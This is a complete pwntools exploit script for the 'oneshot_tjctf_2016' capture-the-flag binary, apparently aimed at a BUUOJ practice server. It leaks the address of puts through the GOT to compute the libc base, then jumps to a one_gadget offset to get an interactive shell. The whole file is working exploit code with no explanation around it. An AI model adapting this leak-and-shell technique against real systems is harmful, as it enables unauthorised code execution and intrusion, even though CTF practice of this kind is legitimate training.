import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./oneshot_tjctf_2016')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./oneshot_tjctf_2016')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',25057)
			elf=ELF('./oneshot_tjctf_2016')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

		


		io.recv()
		io.sendline(str((elf.got[b'puts'])))
		io.recvuntil('0x')
		libc_base=int(io.recv()[:16],16)-libc.sym[b'puts']
		libc.address=libc_base
		log.success('libc_base:'+hex(libc_base))
		io.sendline(str(libc.address+0xf1147))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue